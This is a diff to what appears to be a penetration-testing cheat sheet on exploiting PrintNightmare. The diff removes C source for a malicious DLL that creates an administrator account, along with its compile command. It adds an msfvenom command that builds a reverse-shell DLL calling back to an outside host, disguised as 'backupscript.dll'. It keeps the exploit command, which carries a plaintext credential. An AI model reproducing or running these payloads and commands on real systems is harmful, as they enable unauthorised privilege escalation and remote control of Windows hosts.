@@ -327,37 +327,8 @@ nxc smb ip -u username -p pass -M printnightmare
 ```
 ```
 impacket-smbserver test . -smb2support
-
-#include <stdlib.h>
-#include <windows.h> //appened code
-//name:myDLL.cpp
-
-BOOL APIENTRY DllMain(
-HANDLE hModule,// Handle to DLL module
-DWORD ul_reason_for_call,// Reason for calling function
-LPVOID lpReserved ) // Reserved
-{
-    switch ( ul_reason_for_call )
-    {
-        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
-        int i;
-  	    i = system ("net user dave2 password123! /add"); //appened code
-  	    i = system ("net localgroup administrators dave2 /add"); //appened code
-        break;
-        case DLL_THREAD_ATTACH: // A process is creating a new thread.
-        break;
-        case DLL_THREAD_DETACH: // A thread exits normally.
-        break;
-        case DLL_PROCESS_DETACH: // A process unloads the DLL.
-        break;
-    }
-    return TRUE;
-}
-
-
- x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
-
-python3 printnightmare.py -dll '\\10.21.176.25\test\adduser.dll' 'svc-admin:management2005@10.10.211.60'
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+python3 printnightmare.py -dll '\\10.21.176.25\test\backupscript.dll' 'svc-admin:management2005@10.10.211.60'
 ```
 ### Domain Priviledge Escalation By NoPac CVE-2021-42278 & CVE-2021-42287
 ```
